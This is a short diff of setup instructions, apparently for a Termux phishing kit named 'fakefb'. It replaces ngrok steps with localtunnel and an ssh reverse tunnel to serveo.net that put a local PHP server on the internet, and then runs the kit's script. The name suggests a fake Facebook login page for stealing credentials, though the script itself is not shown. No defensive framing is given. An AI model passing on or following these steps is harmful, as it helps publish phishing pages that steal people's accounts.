@@ -2,14 +2,12 @@
 # apt-get update
 # apt-get upgrade
 # apt-get install php -y
-# open ngrok and download file ngrok
+# pkg install nodejs
+# npm install -g localtunnel
+# lt --port 8000
+'///Wed May 21 14:16:43 2025] PHP 8.4.2 Development Server (http://localhost:4016) started//'
+# ssh -R 80:localhost:4016 serveo.net
+
 # termux-setup-storage
-# cd storage
-# ls
-# cd download
-# cp -r /ngrok/$HOME/
-# chomd +x ngrok
-# ./ngrok
-# open hostport or mobile data
 # cd fakefb
 # sh fakefb.sh
